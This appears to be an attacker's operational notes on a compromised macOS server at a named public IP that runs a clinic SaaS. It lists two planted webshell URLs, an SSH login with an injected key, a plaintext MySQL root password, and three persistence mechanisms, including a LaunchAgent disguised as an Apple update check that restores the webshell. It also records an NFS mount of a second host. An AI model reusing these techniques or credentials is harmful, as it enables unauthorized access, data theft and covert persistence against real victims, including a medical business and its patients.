# Access & Foothold — 208.52.182.90

## Primary Target
- IP: 208.52.182.90
- Hostname: (BEAUTYLiNK clinic SaaS)
- OS: macOS 10.10.5 Yosemite (Intel x86_64)
- User: administrator (uid=501, groups: admin, staff)
- Not root — escalation pending

## Webshells
1. `http://208.52.182.90/beautylink/bl.php?c=<cmd>` — PRIMARY
2. `http://208.52.182.90/beautylink/assets/cache.php?c=<cmd>` — SECONDARY

## SSH Access
```
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa \
    -i /home/cowboy/VDT/intel/208.52.182.90/vdt_id_rsa \
    administrator@208.52.182.90
```
Key type: RSA (git@github.com) — 3rd entry in authorized_keys

## Other Credentials on .90
- MySQL root: `/Applications/MAMP/Library/bin/mysql -u root -pc0ra1t3l3c0m`
- Original SSH users: hiteshlad (DSA), drjoyshah (DSA)

## Persistence Mechanisms (3 layers)
1. **LaunchAgent** (every 5 min) — `com.apple.update.check`
   - Plist: `/Users/administrator/Library/LaunchAgents/com.apple.update.check.plist`
   - Script: `/Users/administrator/Library/.maint.sh`
   - Actions: recreates bl.php, ensures SSH key in authorized_keys
   
2. **Cron** (every hour) — same maint.sh
   - `0 * * * * /bin/bash /Users/administrator/Library/.maint.sh`
   
3. **MAMP web server** — auto-starts via MAMP (webshells persist)

## TeamViewer Status
- Service: `com.teamviewer.service` running (pid 62367, as administrator NOT root)
- LaunchDaemon: /Library/LaunchDaemons/com.teamviewer.teamviewer_service.plist
- Runs as: administrator user (not a root escalation path without root)

## NFS Mount (established from .90)
- Server: 207.254.72.172:/mnt/isodrive
- Command: `mount -t nfs -o tcp,noacl,nolock 207.254.72.172:/mnt/isodrive /tmp/nfs_orka`
- Status: Successfully mounted (mount may not survive reboot — re-run if needed)
- Options: nodev, nosuid, mounted by administrator
